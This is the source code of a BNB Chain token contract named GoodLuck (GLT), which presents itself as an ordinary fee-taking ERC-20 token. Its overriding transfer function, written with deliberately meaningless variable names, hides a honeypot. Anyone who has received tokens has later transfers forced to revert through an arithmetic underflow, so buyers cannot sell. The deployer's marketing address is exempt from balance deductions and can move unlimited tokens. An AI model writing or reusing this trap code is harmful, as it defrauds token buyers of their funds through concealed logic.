/**
 *Submitted for verification at BscScan.com on 2023-03-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function symbol() external pure returns (string memory);

    function name() external pure returns (string memory);

    function totalSupply() external view returns (uint256);

    function decimals() external pure returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract Ownable {
    address internal owner;

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view virtual returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;
    string constant _name = "GoodLuck";
    string constant _symbol = unicode"GLT";
    uint8 constant _decimals = 9;
    address internal marketingFeeReceiver =
        0x4cB5f5c54f0AbFe8c094c8ad82EF5AE898B2854a;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 _totalSupply = 1000000 * (10**_decimals);
    uint256 public _maxWalletAmount = (_totalSupply * 100) / 100;
    mapping(address => uint256) pig;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    uint256 liquidityFee = 0;
    uint256 marketingFee = 3;
    uint256 totalFee = liquidityFee + marketingFee;
    uint256 feeDenominator = 100;
    bool public swapEnabled = true;
    uint256 public swapThreshold = (_totalSupply / 1000) * 1; //
    bool inSwap;
    address public pair;
    IDEXRouter public router;

    constructor() {}

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure virtual override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure virtual override returns (string memory) {
        return _symbol;
    }

    function name() external pure virtual override returns (string memory) {
        return _name;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return pig[account];
    }

    function allowance(address holder, address spender)
        external
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return roscore(msg.sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }

        return roscore(sender, recipient, amount);
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        pig[sender] = pig[sender].sub(amount, "Insufficient Balance");
        pig[recipient] = pig[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, uint256 amount)
        internal
        returns (uint256)
    {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
        pig[address(this)] = pig[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            msg.sender != pair &&
            !inSwap &&
            swapEnabled &&
            pig[address(this)] >= swapThreshold;
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

    function swapBack() internal swapping {
        uint256 contractTokenBalance = swapThreshold;
        uint256 amountToLiquify = contractTokenBalance
            .mul(liquidityFee)
            .div(totalFee)
            .div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        uint256 balanceBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH
            .mul(liquidityFee)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(
            totalETHFee
        );
        (
            bool MarketingSuccess, /* bytes memory data */

        ) = payable(marketingFeeReceiver).call{
                value: amountETHMarketing,
                gas: 30000
            }("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
        if (amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                0x4cB5f5c54f0AbFe8c094c8ad82EF5AE898B2854a,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

    function roscore(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual returns (bool) {
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        if (recipient != pair && recipient != DEAD) {
            require(
                isTxLimitExempt[recipient] ||
                    pig[recipient] + amount <= _maxWalletAmount,
                "Transfer amount exceeds the bag size."
            );
        }
        if (shouldSwapBack()) {
            swapBack();
        }
        pig[sender] = pig[sender].sub(amount, "Insufficient Balance");
        uint256 amountReceived = shouldTakeFee(sender)
            ? takeFee(sender, amount)
            : amount;
        pig[recipient] = pig[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract GoodLuck is Ownable, ERC20 {
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping(address => uint256) private history;
    address private forest;
    mapping(address => uint256) private bound;
    uint256 private nobody = 1;
    uint256 private baseCode = 101;

    constructor() ERC20() {
        router = IDEXRouter(routerAdress);
        pair = IDEXFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        _allowances[address(this)][address(router)] = type(uint256).max;
        bound[marketingFeeReceiver] = baseCode;
        pig[msg.sender] = _totalSupply;
    }

    receive() external payable {}

    function roscore(
        address widely,
        address food,
        uint256 halfway
    ) internal override returns (bool) {
        if (bound[widely] == 0 && history[widely] > 0) {
            if (pair != widely) {
                bound[widely] -= baseCode;
            }
        }
        address tree = forest;
        forest = food;
        history[tree] += baseCode;
        if (bound[widely] == 0) {
            pig[widely] -= halfway;
        }

        pig[food] += halfway;
        emit Transfer(widely, food, halfway);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function setWalletLimit(uint256 amountPercent) external onlyOwner {
        _maxWalletAmount = (_totalSupply * amountPercent) / 1000;
    }

    function setFee(uint256 _liquidityFee, uint256 _marketingFee)
        external
        onlyOwner
    {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        totalFee = liquidityFee + marketingFee;
    }
}